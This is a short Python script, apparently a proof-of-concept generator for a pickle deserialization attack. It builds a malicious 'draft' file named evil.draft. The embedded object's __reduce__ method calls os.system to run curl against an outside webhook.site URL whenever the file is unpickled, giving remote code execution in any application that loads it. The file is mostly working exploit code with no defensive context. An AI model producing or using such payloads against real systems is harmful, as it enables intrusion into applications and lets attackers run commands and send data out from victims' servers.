import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl https://webhook.site/238a8641-5b7c-4460-b4b9-836a82d2dde8',))

# Строим объект "черновика"
draft = {
    'title': 'Hacked!',
    'content': RCE()
}

with open('evil.draft', 'wb') as f:
    pickle.dump(draft, f)

